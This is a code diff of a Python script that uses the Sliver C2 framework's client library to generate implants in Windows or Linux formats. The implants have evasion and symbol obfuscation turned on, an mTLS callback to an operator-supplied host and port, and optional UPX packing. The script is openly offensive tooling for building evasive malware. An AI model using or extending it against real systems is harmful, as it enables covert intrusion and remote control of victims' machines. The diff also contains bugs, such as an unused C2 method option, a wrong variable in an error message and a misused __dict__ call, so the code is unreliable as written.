@@ -11,89 +11,88 @@
 
 import os
 import asyncio
+from halo import Halo
 import argparse
 from enum import Enum
-from sliver import SliverClientConfig, AsyncSliverClient, client_pb2
+from sliver import SliverClientConfig, SliverClient, client_pb2
 
 CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".sliver-client", "configs")
 CONFIG_PATH = os.path.join(CONFIG_DIR, "default.cfg")
 
-
-class OS(Enum):
-	windows = 1
-	linux = 2
-	osx = 3
-
-class Format(Enum):
-	windows = 1
-	linux = 2
-	osx = 3
-
+def error(string):
+    print(f'[] Error: {string}')
+    exit(-1)
 
 async def main(args):
 
     ''' Client connect example '''
     config = SliverClientConfig.parse_config_file(CONFIG_PATH)
-    client = AsyncSliverClient(config)
+    client = SliverClient(config)
     await client.connect()
 
-	name = "testimplant"
-	evasion = True
-	ObfuscateSymbols = True
+    name = "testimplant"
+    evasion = True
+    ObfuscateSymbols = True
 
-	if (os == OS.windows):
-		os_pb = "windows"
-		if (format_type == Format.DLL):
-			format_pb = client_pb2.OutputFormat.SHARED_LIB
-		elif (format_type == Format.EXE):
-			format_pb = client_pb2.OutputFormat.EXECUTABLE
-		else:
-			error("unsupported format")
-	elif (os == OS.linux):
-		os_pb = "linux"
-		if (format_type == Format.SO):
-			format_pb = client_pb2.OutputFormat.SHARED_LIB
-		elif (format_type == Format.ELF):
-			format_pb = client_pb2.OutputFormat.EXECUTABLE
-		else:
-			error("unsupported format")
-	else:
-		error("unsupported OS")
 
-	if args.output:
-		output_filename = args.output
+    if args.format.lower() == 'elf':
+        os_pb = 'linux'
+        format_pb = client_pb2.OutputFormat.EXECUTABLE
+    elif args.format.lower() == 'so':
+        os_pb = 'linux'
+        format_pb = client_pb2.OutputFormat.SHARED_LIB
+    elif args.format.lower() == 'exe':
+        os_pb = 'windows'
+        format_pb = client_pb2.OutputFormat.EXECUTABLE
+    elif args.format.lower() == 'dll': 
+        os_pb = 'windows'
+        format_pb = client_pb2.OutputFormat.SHARED_LIB
+    else:
+        error(f"unsupported format {args.os}")
 
-	ImplantC2 = client_pb2.ImplantC2(URL="mtls://IP:port")
+    if args.output:
+        output_filename = args.output
 
-	config = client_pb2.ImplantConfig(name=name, evasion=evasion, ObfuscateSymbols=ObfuscateSymbols, format=format_pb, GOOS=os_pb)
-	await client.generate()
-	print("implant generated")
-	print(f"saved to {output_filename}")
+    ImplantC2 = client_pb2.ImplantC2(URL=f"mtls://{args.lhost}:{args.port}")
+    config = client_pb2.ImplantConfig(Name=name, C2=[ImplantC2], Evasion=evasion, ObfuscateSymbols=ObfuscateSymbols, Format=format_pb, GOOS=os_pb, GOARCH="amd64")
 
-	if args.upx == True:
-		print("compressing")
-		try:
-			os.system(f'upx -9 {output_filename}')
-		except Exception as e:
-			raise e
+    spinner = Halo(text='Generating', spinner='dots', text_color='green')
+    spinner.start()
+    try:
+
+        output = await client.generate(config)
+        print(output.__dict__())
+    except Exception as e:
+        raise e
+    spinner.stop()   
+    
+
+    print("implant generated")
+    print(f"saved to {output_filename}")
+
+    if args.upx == True:
+        print("compressing")
+        try:
+            os.system(f'upx -9 {output_filename}')
+        except Exception as e:
+            raise e
 
 if __name__ == '__main__':
 
-	parser = argparse.ArgumentParser()
-	parser.add_argument('-f', '--format',choices=["exe", "elf", "dll", "so"], help='format to generate')
-	parser.add_argument('-o', '--output', help='file to write to')
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-f', '--format',choices=["exe", "elf", "dll", "so"], required=True, help='format to generate')
+    parser.add_argument('-o', '--output', required=True , help='file to write to')
 
 
-	parser.add_argument('-m', '--method', choices=["mtls", "https", "dll", "so"], help='C2 method')
+    parser.add_argument('-m', '--method', choices=["mtls", "https", "dll", "so"], default='mtls', help='C2 method')
 
-	parser.add_argument('-l', '--lhost', help='C2 ip / hostname')
-	parser.add_argument('-p', '--port', help='C2 port')
+    parser.add_argument('-l', '--lhost', required=True, help='C2 ip / hostname')
+    parser.add_argument('-p', '--port', required=True, help='C2 port')
 
-	parser.add_argument('-u', '--upx', action='store_true', default=True, help='UPX compress')
+    parser.add_argument('-u', '--upx', action='store_true', default=True, help='UPX compress')
 
-	args = parser.parse_args()
+    args = parser.parse_args()
 
-	if not args.format
 
     loop = asyncio.get_event_loop()
     loop.run_until_complete(main(args))
@@ -102,3 +101,4 @@ if __name__ == '__main__':
 
 
 # https://sliverpy.readthedocs.io/en/latest/protobuf/client_pb2.html#sliver.pb.clientpb.client_pb2.ImplantConfig
+# https://github.com/BishopFox/sliver/blob/master/protobuf/clientpb/client.proto
